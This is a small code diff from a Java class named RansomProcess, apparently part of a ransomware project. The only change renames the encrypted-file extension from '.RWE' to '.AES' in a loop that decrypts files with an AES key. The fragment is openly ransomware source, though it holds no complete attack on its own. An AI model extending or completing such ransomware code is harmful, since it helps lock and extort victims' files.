@@ -92,7 +92,7 @@ public class RansomProcess {
 
                     Map.Entry entry = (Map.Entry) mapiterator.next();
                     final File filein = new File(entry.getKey() + "." + entry.getValue());
-                    final File fileout = new File(entry.getKey() + ".RWE");
+                    final File fileout = new File(entry.getKey() + ".AES");
 
 
                     CryptoRansomware.DecryptFile(fileout, filein, aesKey);
